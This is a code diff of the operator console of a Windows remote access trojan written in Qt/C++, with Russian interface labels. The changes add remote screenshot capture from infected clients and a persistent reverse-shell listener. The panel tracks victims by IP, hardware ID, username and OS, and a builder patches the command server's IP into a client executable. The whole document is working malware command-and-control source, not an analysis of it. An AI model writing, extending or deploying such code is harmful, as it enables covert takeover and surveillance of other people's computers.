@@ -1,37 +1,46 @@
 #include "mwindow.h"
-#include "ui_mwindow.h"
 #include "sqlite3.h"
+#include "ui_mwindow.h"
 #include "ui_screenshot.h"
 #include "ui_explorer.h"
+#include "ui_wscreenshot.h"
 
-#include <QFileDialog>
-#include <QInputDialog>
+SOCKET          MSOCKETS[10000];
+QThread         *TRDS[10000];
+WSocket         *RVHD[10000];
+sqlite3*        db;
 
-SOCKET MSOCKETS[10000];
-sqlite3* db;
-
-ScreenShot::ScreenShot(QWidget *parent) :
+WScreenShot::WScreenShot(QWidget *parent) :
     QWidget(parent),
-    ui(new Ui::ScreenShot)
+    ui(new Ui::WScreenShot)
 {
     ui->setupUi(this);
 }
 
-ScreenShot::~ScreenShot()
+WScreenShot::~WScreenShot()
 {
     delete ui;
 }
 
-Explorer::Explorer(QWidget *parent) :
-    QWidget(parent),
-    ui(new Ui::Explorer)
+void WScreenShot::GetBitmap(BYTE *bytes, unsigned int Size, int w, int h)
 {
-    ui->setupUi(this);
-}
+    HDC hScreen = GetDC(NULL);
+    HDC hDC = CreateCompatibleDC(hScreen);
+    SetStretchBltMode(hDC, HALFTONE);
+    StretchBlt(hDC, 0, 0, 683, 384, hScreen, 0, 0, w, h, SRCCOPY);
+    int bitmapSize = Size;
+    BITMAPINFO bm = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
+    HBITMAP bmp = CreateDIBSection(hDC, &bm, DIB_RGB_COLORS, (void**)&bitmapSize, 0, 0);
+    SetDIBits(hDC, bmp, 0, Size, bytes, &bm, DIB_RGB_COLORS);
+    this->pixmap = qt_pixmapFromWinHBITMAP(bmp);
+    QPixmap pix = this->pixmap.scaled(ui->label->width(), ui->label->height(), Qt::KeepAspectRatio);
+    ui->label->setPixmap(pix);
 
-Explorer::~Explorer()
-{
-    delete ui;
+    memset(&bm, 0, sizeof(bm));
+    DeleteDC(hDC);
+    DeleteDC(hScreen);
+    DeleteObject(bmp);
+    free(bytes);
 }
 
 WSocket::WSocket(int Port)
@@ -183,10 +192,18 @@ void WSocket::ReversCmd(int NOMER)
     send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
 }
 
-void WSocket::WaitShell(int NOMER)
+void WSocket::GetScreen(int NOMER)
+{
+    CMDiDATA indata;
+    memset(&indata, 0, sizeof(CMDiDATA));
+    indata.CMD = CMD_SCREEN;
+    send(MSOCKETS[NOMER], (char*)&indata, sizeof(CMDiDATA), 0);
+}
+
+void WSocket::WaitShell()
 {
     char szBuffer[4096];
-    int i, count = 0;
+    int i = 0;
     HANDLE  hIn, hOut;
     DWORD lpNumberOfBytesRead;
 
@@ -200,39 +217,37 @@ void WSocket::WaitShell(int NOMER)
     bind(sListen, (SOCKADDR*)&addr, sizeofaddr);
     listen(sListen, SOMAXCONN);
 
-    AllocConsole();
-    SetConsoleTitleA(" :: rat control :: ");
-    hIn = GetStdHandle(STD_INPUT_HANDLE);
-    hOut = GetStdHandle(STD_OUTPUT_HANDLE);
-
-    SOCKET newConn = accept(sListen, (sockaddr*)&addr, &sizeofaddr);
-
     while (TRUE)
     {
-        memset(szBuffer, 0, sizeof(szBuffer));
-        Sleep(100);
-        i = recv(newConn, szBuffer, sizeof(szBuffer), 0);
-        WriteFile(hOut, szBuffer, i, &lpNumberOfBytesRead, 0);
-        memset(szBuffer, 0, sizeof(szBuffer));
-        Sleep(100);
-        if (ReadFile(hIn, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL))
+        SOCKET newConn = accept(sListen, (sockaddr*)&addr, &sizeofaddr);
+
+        AllocConsole();
+        SetConsoleTitleA(" :: revers shell :: ");
+        hIn = GetStdHandle(STD_INPUT_HANDLE);
+        hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+
+        while (TRUE)
         {
-            if ((!strstr(szBuffer, "exit")) == 0)
+            memset(szBuffer, 0, sizeof(szBuffer));
+            Sleep(100);
+            i = recv(newConn, szBuffer, sizeof(szBuffer), 0);
+            WriteFile(hOut, szBuffer, i, &lpNumberOfBytesRead, 0);
+            memset(szBuffer, 0, sizeof(szBuffer));
+            Sleep(100);
+            if (ReadFile(hIn, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL))
             {
+                if ((!strstr(szBuffer, "exit")) == 0)
+                {
+                    send(newConn, szBuffer, lpNumberOfBytesRead, 0);
+                    closesocket(newConn);
+                    FreeConsole();
+                    break;
+                }
                 send(newConn, szBuffer, lpNumberOfBytesRead, 0);
-                goto exit;
             }
-            send(newConn, szBuffer, lpNumberOfBytesRead, 0);
         }
     }
-
-exit:
-    closesocket(sListen);
-    closesocket(newConn);
-    FreeConsole();
-    emit CloseShell();
 }
-
 
 void WSocket::CheckOnline()
 {
@@ -258,6 +273,59 @@ void WSocket::CheckOnline()
         sqlite3_finalize(stmt);
     }
 }
+
+void WSocket::Recving(int NOMER)
+{
+    while(TRUE)
+    {
+        CMDiDATA cmdProtocol;
+        memset(&cmdProtocol, 0, sizeof(CMDiDATA));
+
+        if (sizeof(CMDiDATA) != recv(MSOCKETS[NOMER], (char*)&cmdProtocol, sizeof(CMDiDATA), 0))
+        {
+            break;
+        }
+
+        switch (cmdProtocol.CMD)
+        {
+            case CMD_SHELL:
+            {
+                break;
+            }
+            case CMD_SCREEN:
+            {
+                BIGSCREEN screenshot;
+                memset(&screenshot, 0, sizeof(BIGSCREEN));
+                memcpy(&screenshot, cmdProtocol.DATA, sizeof(BIGSCREEN));
+                int size = screenshot.ZipSize;
+
+                BYTE *compressedPixels = (BYTE *)malloc(screenshot.ZipSize);
+                int   totalRead = 0;
+
+                do
+                {
+                    int read = recv(MSOCKETS[NOMER], (char *)compressedPixels + totalRead, size - totalRead, 0);
+                    if (read <= 0)
+                        break;
+                    totalRead += read;
+                } while (totalRead != size);
+
+                DWORD realDecompSize;
+                BYTE *decompressed_buffer = Decompress(compressedPixels, screenshot.ZipSize, screenshot.Size, &realDecompSize);
+
+                emit GetBitmap(decompressed_buffer, realDecompSize, screenshot.w, screenshot.h);
+
+                memset(&screenshot, 0, sizeof(screenshot));
+                free(compressedPixels);
+                break;
+            }
+
+            default:
+                break;
+        }
+    }
+}
+
 
 void WSocket::InitArchiveFunc()
 {
@@ -418,21 +486,25 @@ MWindow::MWindow(QWidget *parent)
         }
     }
 
+    memset(MSOCKETS, 0, sizeof(MSOCKETS));
+    memset(TRDS, 0, sizeof(TRDS));
+    memset(RVHD, 0, sizeof(RVHD));
+
     menu = new QMenu(this);
 
-    Revershell = new QAction("Revershell", this);
+    Revershell = new QAction("Реверсшелл", this);
     connect(Revershell, SIGNAL(triggered()), this, SLOT(sRunShell()));
     menu->addAction(Revershell);
 
-    Explorer = new QAction("Explorer", this);
+    Explorer = new QAction("Проводник", this);
     connect(Explorer, SIGNAL(triggered()), this, SLOT(sExplorer()));
     menu->addAction(Explorer);
 
-    ScreenShot = new QAction("ScreenShot", this);
+    ScreenShot = new QAction("Скриншот", this);
     connect(ScreenShot, SIGNAL(triggered()), this, SLOT(sScreen()));
     menu->addAction(ScreenShot);
 
-    Loader = new QAction("Loader", this);
+    Loader = new QAction("Лоадер", this);
     connect(Loader, SIGNAL(triggered()), this, SLOT(sLoader()));
     menu->addAction(Loader);
 
@@ -446,21 +518,39 @@ MWindow::MWindow(QWidget *parent)
     connect(ui->tableWidget, SIGNAL(customContextMenuRequested(QPoint)), \
             this, SLOT(sOpenMenu(QPoint)));
 
+    screenShot = new WScreenShot();
+
     wsocket80 = new WSocket(80);
-    servHandl = new WSocket(80);
+    sendHandl = new WSocket(80);
+    shellSocket = new WSocket(8080);
 
     mainSocketThread = new QThread(this);
-    connect(wsocket80, &WSocket::AddNewClient, this, &MWindow::AddNewClient);
-    connect(servHandl, &WSocket::DelClient, this, &MWindow::DelClient);
-    connect(this, &MWindow::WaitClient, wsocket80, &WSocket::WaitClient);
+    sendSocketThread = new QThread(this);
+    shellSocketThread = new QThread(this);
 
-    connect(this, &MWindow::CheckOnline, servHandl, &WSocket::CheckOnline);
-    connect(this, &MWindow::ReversCmd, servHandl, &WSocket::ReversCmd);
+    connect(wsocket80, &WSocket::AddNewClient, this, &MWindow::AddNewClient);
+    connect(sendHandl, &WSocket::DelClient, this, &MWindow::DelClient);
+    connect(this, &MWindow::WaitClient, wsocket80, &WSocket::WaitClient);
     connect(this, SIGNAL(destroyed()), mainSocketThread, SLOT(quit()));
+
+    connect(this, &MWindow::CheckOnline, sendHandl, &WSocket::CheckOnline);
+    connect(this, &MWindow::ReversCmd, sendHandl, &WSocket::ReversCmd);
+    connect(this, &MWindow::GetScreen, sendHandl, &WSocket::GetScreen);
+
+    connect(this, SIGNAL(destroyed()), sendSocketThread, SLOT(quit()));
+    sendHandl->moveToThread(sendSocketThread);
+    sendSocketThread->start();
+
+    connect(this, &MWindow::WaitShell, shellSocket, &WSocket::WaitShell);
+    connect(this, SIGNAL(destroyed()), shellSocketThread, SLOT(quit()));
+    shellSocket->moveToThread(shellSocketThread);
+    shellSocketThread->start();
 
     wsocket80->moveToThread(mainSocketThread);
     mainSocketThread->start();
+
     emit WaitClient();
+    emit WaitShell();
 }
 
 void MWindow::sOpenMenu(QPoint pos)
@@ -481,14 +571,7 @@ void MWindow::sRunShell()
         if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
         {
             int NOMER = item->text().toInt();
-            shellSocket = new WSocket(8080);
-            shellSocketThread = new QThread(this);
-            connect(this, &MWindow::WaitShell, shellSocket, &WSocket::WaitShell);
-            connect(shellSocket, &WSocket::CloseShell, this, &MWindow::CloseShell);
-            shellSocket->moveToThread(shellSocketThread);
-            shellSocketThread->start();
-            servHandl->ReversCmd(NOMER);
-            emit WaitShell(intROW);
+            emit ReversCmd(NOMER);
         }
     }
 }
@@ -523,6 +606,13 @@ void MWindow::sScreen()
         if(QTableWidgetItem *item = ui->tableWidget->item(intROW, 0))
         {
             int NOMER = item->text().toInt();
+            if (screenShot->isVisible())
+            {
+                emit GetScreen(NOMER);
+            } else {
+                screenShot->show();
+                emit GetScreen(NOMER);
+            }
         }
     }
 }
@@ -546,6 +636,16 @@ void MWindow::sLoader()
 
 void MWindow::AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER)
 {
+    RVHD[NOMER] = new WSocket(80);
+    TRDS[NOMER] = new QThread(this);
+
+    connect(this, &MWindow::Recving, RVHD[NOMER], &WSocket::Recving);
+    connect(RVHD[NOMER], &WSocket::GetBitmap, screenShot, &WScreenShot::GetBitmap);
+    connect(this, SIGNAL(destroyed()), TRDS[NOMER], SLOT(quit()));
+
+    RVHD[NOMER]->moveToThread(TRDS[NOMER]);
+    TRDS[NOMER]->start();
+
     ui->tableWidget->insertRow(ui->tableWidget->rowCount());
     ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                              0, new QTableWidgetItem(QString::number(NOMER)));
@@ -557,6 +657,8 @@ void MWindow::AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char
                              3, new QTableWidgetItem(QString::fromUtf8(USERNAME)));
     ui->tableWidget->setItem(ui->tableWidget->rowCount()-1, \
                              4, new QTableWidgetItem(QString::fromUtf8(OSVER)));
+
+    emit Recving(NOMER);
 }
 
 void MWindow::DelClient(int NOMER)
@@ -568,6 +670,10 @@ void MWindow::DelClient(int NOMER)
         {
             if(item->text() == QString::number(NOMER))
             {
+                TRDS[NOMER]->terminate();
+                MSOCKETS[NOMER] = 0;
+                TRDS[NOMER] = 0;
+                RVHD[NOMER] = 0;
                 ui->tableWidget->removeRow(i);
             }
         }
@@ -576,19 +682,19 @@ void MWindow::DelClient(int NOMER)
 
 void MWindow::CloseShell()
 {
-    shellSocketThread->quit();
+    //shellSocketThread->quit();
 }
 
 void MWindow::on_CreateBuild_triggered()
 {
     QString file1Name = QFileDialog::getOpenFileName(this, \
-        tr("Patch Client"), \
+        tr("Пропатчить клиент"), \
         qApp->applicationDirPath(), \
-        tr("EXE File (*.exe)"));
+        tr("Бинарый файл клиента (*.exe)"));
     FILE* f = fopen(file1Name.toUtf8(), "r+b");
     if (f != NULL)
     {
-        QString InputText = QInputDialog::getText(this,"Введите IP","127.000.000.001");
+        QString InputText = QInputDialog::getText(this, "Введите IP", "согласно маске 127.000.000.001");
         unsigned char ipaddr[16];
         memcpy(ipaddr, InputText.toUtf8(), 15);
         fseek(f, 0xFA10, SEEK_SET);
@@ -622,5 +728,5 @@ MWindow::~MWindow()
 
 void MWindow::on_OnlineRecv_triggered()
 {
-    emit CheckOnline();
+    sendHandl->CheckOnline();
 }
